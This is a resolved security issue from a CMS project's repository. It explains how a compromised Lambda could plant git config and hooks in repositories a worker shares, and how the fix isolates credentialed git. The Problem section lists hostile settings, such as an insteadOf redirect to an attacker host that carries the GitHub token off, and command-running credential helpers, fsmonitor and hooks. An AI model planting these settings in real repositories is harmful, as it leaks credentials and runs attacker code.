---
priority: P1
adopters: BOTH
summary: >-
  RESOLVED 2026-10-09, branch `fix/worker-git-config-isolation`, base `int-202610-b`. Every git command carrying the GitHub credential runs in a worker-private mirror under the unit's `StateDirectory=` (worker/github-mirror.ts), moving objects to and from `remote.git` only through pinned `upload-pack --strict`/`receive-pack` commands. Every other worker git in `remote.git` or a clone runs through `sharedRepoGit` (explicit GIT_DIR, hooks and config hooks, fsmonitor, helpers, signing and non-local transports pinned off) after `assertSharedRepoConfig` refuses any repository-config key CanopyCMS never writes, or a submodule with a repository in it (worker/shared-repo-git.ts). The races that check leaves (a driver planted between it and git's read, a stopped rebase's state) are filed as worker-shared-repo-git-process-split.md (P1); the mirror's limits on large repositories as worker-github-mirror-limits.md (P3)
---
# [P1] The worker trusts git config and hooks the Lambda can write

**Status: RESOLVED 2026-10-09**, branch `fix/worker-git-config-isolation`; see the summary.

**Priority:** P1 [BOTH]. **Found:** 2026-10-09, by the security review of
[worker-instance-hardening.md](worker-instance-hardening.md); pre-existing.

## Problem

The deployment's security model (docs/deploying-to-aws.md, Security Model) is that a compromised
CMS Lambda can read and write content on EFS but cannot reach GitHub or the worker's secrets.
`CmsWorker.scrubPersistedRemote` (packages/canopycms/src/worker/cms-worker.ts) already defends
that model against one EFS-borne leak, a token in `remote.origin.url`.

Git config and hooks are a wider version of the same hole. Both processes write the shared
access point as uid 1000, so the Lambda can write `remote.git/config`, any branch clone's
`.git/config`, and `.git/hooks/*`. When the worker next runs git there:

- `url.https://attacker/.insteadOf=https://github.com/` redirects the push, and git applies
  `insteadOf` to the explicit `https://x-access-token:<token>@github.com/...` URL the worker
  passes. The token then goes to the attacker's host.
- `credential.helper=!<cmd>`, `core.fsmonitor=<cmd>`, `core.sshCommand` or a hook (directly, or
  through `core.hooksPath`) runs a command as the worker user. That user can reach IMDS and holds
  the instance role.
- `http.proxy` routes the push through an attacker's proxy.

None of the instance hardening helps: the process is doing its normal job.

## Fix

- Before each worker git operation in a shared repository, rewrite `.git/config` to known-good
  content and verify it, as `scrubPersistedRemote` does, or refuse to run on unexpected keys.
- Pass `-c core.hooksPath=<an empty root-owned dir> -c credential.helper= -c core.fsmonitor=false
  -c protocol.allow=never -c protocol.https.allow=always` through the existing `-c` plumbing
  (`NO_AUTO_GC_CONFIG` in packages/canopycms/src/git-manager.ts). Command-line `-c` overrides
  repository config, but `insteadOf` and `http.*` keys need an explicit override or an allowlist.
- Add a test that writes each hostile key into a fixture repository and asserts the worker's push
  ignores it.

## Resolution

Measured at git 2.55: `-c` cannot neutralize `url.<x>.insteadOf` (a prefix match on
`https://x-access-token` carries the token to another host), url-scoped `http.<url>.*`, or
filter and merge drivers, and `core.hooksPath` does not stop config-defined hooks
(`hook.<name>.command`), which `hook.<event>.enabled=false` does. Review rounds added: submodules (status and a continuing rebase's commit descend into one under its own config), signature verification, push negotiation, lazy fetches, an `include.path` naming a pipe, git's repository discovery (now an explicit `GIT_DIR`) and `remote.git/.git` (`upload-pack --strict`). Hence the private mirror for
everything that carries the credential, and the pins plus the allowlist check for the rest.
Decisions: the mirror is on the instance's root volume, not a worker-only EFS path; the CDK
runner refuses to start without `$STATE_DIRECTORY`, while the core library falls back to
`os.tmpdir()` for dev and tests; an unexpected key is refused, not warned about. Pinned by
`cms-worker-hostile-git-config.test.ts`, `shared-repo-git.test.ts` and `github-mirror.test.ts`.
